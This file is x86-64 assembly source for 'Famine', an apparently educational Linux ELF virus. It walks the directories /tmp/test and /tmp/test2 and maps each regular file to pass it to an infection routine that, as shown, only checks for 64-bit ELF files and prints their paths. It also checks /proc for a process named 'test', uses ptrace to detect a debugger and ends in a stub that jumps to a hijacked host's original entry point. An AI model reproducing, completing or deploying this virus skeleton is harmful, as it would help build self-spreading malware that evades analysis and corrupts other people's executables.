%include "asm/header.s"

section .text
global _start

_start:
	PUSHAQ
	mov rbp, rsp
	jmp main

strcmp:
	enter 0, 0
	push r8
	dec rsi
	dec rdi
	strcmp_while:
		inc rdi
		inc rsi
		mov r8b, byte[rdi]
		cmp r8b, 0
		je end_strcmp_while
		cmp r8b, byte[rsi]
		je strcmp_while
	end_strcmp_while:
	xor rax, rax
	mov al, byte[rdi]
	sub al, byte[rsi]
	pop r8
	leave
	ret

strcat:
	enter 0, 0
	push r8
	push rdi
	call strlen
	pop rdi
	add rdi, rax
	dec rsi
	strcat_while:
		inc rsi
		mov r8b, byte[rsi]
		mov byte[rdi], r8b
		inc rdi
		cmp byte[rsi], 0
		jne strcat_while
	mov byte[rdi], 0
	pop r8
	leave
	ret

strlen:
	enter 0, 0
	push rsi
	mov rax, 0
	mov rsi, rdi
	dec rsi
	strlen_while:
		inc rsi
		cmp byte[rsi], 0
		jne strlen_while
	sub rsi, rdi
	mov rax, rsi
	pop rsi
	leave
	ret

puts:
	enter 0, 0
	push r8
	push rcx
	push rdi
	call strlen
	pop rsi
	mov r8b, byte[rsi + rax - 1]
	xor rdi, rdi
	mov rdx, rax
	mov rax, sys_write
	syscall
	padding
	cmp r8b, 0xa
	je end_puts
	mov rdi, 0
	lea rsi, [rel new_line]
	mov rdx, 1
	mov rax, sys_write
	syscall
	end_puts:
	pop rcx
	pop r8
	leave
	ret

infect_elf:		; r8:elf_struc
	enter 0, 0
	mov r8, rdi
	mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
	cmp rax, 64
	jl infect_elf_end
	mov rdi, QWORD[r8 + elf_struc.ptr]
	mov QWORD[r8 + elf_struc.ehdr], rdi

	mov rdi, QWORD[r8 + elf_struc.ehdr]
	mov dil, BYTE[rdi + ehdr.ei_class]
	cmp dil, 2
	jne infect_elf_end 


	mov rdi, QWORD[r8 + elf_struc.path]
	call puts
	
	infect_elf_end:
	leave
	ret

process_file:
	enter 0, 0
	sub rsp, ELF_STRUC_SIZE
	mov QWORD[rsp + elf_struc.path], rdi

	mov rax, sys_lstat
	lea rsi, [rsp + elf_struc.stat]
	syscall
	padding
	cmp rax, 0
	jl process_file_end

	mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
	and eax, TYPE_MASK
	cmp eax, DIRECTORY_MODE
	jne not_a_directory
		mov rdi, QWORD[rsp + elf_struc.path]
		call strlen
		mov rdi, QWORD[rsp + elf_struc.path]
		mov byte[rdi + rax], 0x2f
		mov byte[rdi + rax + 1], 0
		lea rsi, [rel process_file]
		call process_dir
		jmp process_file_end
	not_a_directory:
	mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
	and eax, TYPE_MASK
	cmp eax, FILE_MODE
	jne process_file_end

	mov rdi, QWORD[rsp + elf_struc.path]
	mov rsi, OPEN_FILE_PERMISSION
	mov rax, sys_open
	syscall						; opening the file
	padding
	mov DWORD[rsp + elf_struc.fd], eax
	cmp eax, 0
	jl process_file_end
	mov rax, QWORD[rsp + elf_struc.stat + stat.st_size]
	cmp rax, 0
	jle close_file

	mov rdi, 0
	mov rsi, QWORD[rsp + elf_struc.stat + stat.st_size]
	mov rdx, MMAP_PROT
	mov r10, MAP_PRIVATE
	xor r8, r8
	mov r8d, DWORD[rsp + elf_struc.fd]
	mov r9, 0
	mov rax, sys_mmap
	syscall						;mmap the file
	padding
	mov QWORD[rsp + elf_struc.ptr], rax
	cmp rax, 0
	jl close_file
	;infect routine

	mov rdi, rsp
	call infect_elf

	;end of infect routine
	mov rdi, QWORD[rsp + elf_struc.ptr]
	xor rsi, rsi
	mov esi, DWORD[rsp + elf_struc.stat + stat.st_size]
	mov rax, sys_munmap			;munmap the file
	syscall
	padding

	close_file:
	mov edi, DWORD[rsp + elf_struc.fd]
	mov rax, sys_close
	syscall
	padding
	process_file_end:
	mov rax, 0
	leave
	ret

check_proc:
	enter 0, 0
	sub rsp, NAME_SIZE + CONTENT_SIZE

	mov r8, rdi
	lea rdi, [rbp - NAME_SIZE]
	mov byte[rdi], 0
	mov rsi, r8
	call strcat
	lea rdi, [rbp - NAME_SIZE]
	lea rsi, [rel proc_name_file]
	call strcat

	lea rdi, [rbp - NAME_SIZE]
	mov rsi, OPEN_PROC_PERMISSION
	mov rax, sys_open
	syscall			;open the proc file
	padding
	mov r10, rax
	cmp rax, 0
	jl proc_ret_0

	mov rdi, rax
	lea rsi, [rsp]
	mov rdx, CONTENT_SIZE
	mov rax, sys_read
	syscall			;read the proc file
	padding
	mov byte[rsp + rax], 0
	cmp rax, 0
	jl proc_ret_0

	mov rax, sys_close
	mov rdi, r10
	syscall			;close the proc file
	padding

	lea rdi, [rsp]
	lea rsi, [rel proc_ban]
	call strcmp
	cmp rax, 0
	jne proc_ret_0

	mov rax, 1
	jmp proc_end
	proc_ret_0:
	mov rax, 0
	proc_end:
	leave
	ret

process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:function pointer		r11:ret value
	enter 0, 0
	sub rsp, DIRENT_SIZE + NAME_SIZE
	mov r13, rdi
	mov r10, rsi
	mov rax, sys_open
	mov rsi, OPEN_DIR_PERMISSION
	xor rdx, rdx
	syscall							; it opens the dir
	padding
	mov r12, rax
	cmp rax, 0
	jl end_process_dir
	read_dirent:
		mov rdi, r12
		lea rsi, [rsp]
		mov rdx, DIRENT_SIZE
		mov rax, sys_getdents
		syscall						; it reads dir entries
		padding

		cmp rax, 0
		jle close_dir
		mov r9, rax
		add r9, rsp
		mov rcx, rsp
		file_listing:
			lea rdi, [rcx + linux_dirent.d_name]
			lea rsi, [rel dot]
			call strcmp
			cmp rax, 0
			je end_if_not_dot
			lea rdi, [rcx + linux_dirent.d_name]
			lea rsi, [rel ddot]
			call strcmp
			cmp rax, 0
			je end_if_not_dot
			;if entry not a dot or double dot
				lea rdi, [rbp - NAME_SIZE]
				mov byte[rdi], 0
				lea rsi, [r13]
				call strcat
				lea rdi, [rbp - NAME_SIZE]
				lea rsi, [rcx + linux_dirent.d_name]
				call strcat

				lea rdi, [rbp - NAME_SIZE]
				push r10
				push r11
				push rcx
				push r9
				push r12
				push r13
				call r10
				pop r13
				pop r12
				pop r9
				pop rcx
				pop r11
				pop r10
				cmp rax, 1
				mov r11, 1
				je close_dir
				mov r11, 0
			end_if_not_dot:

			xor r8, r8
			mov r8w, WORD [rcx + linux_dirent.d_reclen]
			add rcx, r8
			cmp rcx, r9
			jl file_listing
		jmp read_dirent
	close_dir:
	push r11
	mov rax, sys_close
	mov rdi, r12
	syscall
	pop r11
	end_process_dir:
	mov rax, r11
	leave
	ret

check_debugger:
	enter 0, 0
	mov rax, sys_ptrace
	mov rdi, 0
	syscall
	cmp rax, 0
	jl ret_1_debugger
	mov rdi, 17
	mov rsi, 0
	mov r10, 0
	syscall
	mov rax, 0
	jmp end_check_debugger
	ret_1_debugger:
	mov rax, 1
	end_check_debugger:
	leave
	ret

main:
	call check_debugger
	cmp rax, 1
	;je jmp_old_entry
	lea rdi, [rel proc_dir]
	lea rsi, [rel check_proc]
	call process_dir
	cmp rax, 1
	je jmp_old_entry
	lea rdi, [rel dir1]
	lea rsi, [rel process_file]
	call process_dir
	lea rdi, [rel dir2]
	lea rsi, [rel process_file]
	call process_dir
	jmp jmp_old_entry

jmp_old_entry:
	mov rdi, 0x1111111111111111
	mov rsi, 0x1111111111111111
	cmp rdi, rsi
	jne the_jump							; exit if real famine
		mov rax, 60
		xor rdi, rdi
	syscall
	the_jump:
	lea rax, [rel _start]
	sub rax, rdi
	POPAQ
	jmp rdi

signature:
	db 'Famine version 1.0 (c)oded by gdelabro', 0
dir1:
	db '/tmp/test/', 0
dir2:
	db '/tmp/test2/', 0
proc_dir:
	db '/proc/', 0
proc_name_file:
	db '/comm', 0
proc_ban:
	db 'test', 0xa, 0
new_line:
	db 0x0a, 0
dot:
	db ".", 0
ddot:
	db "..", 0
end: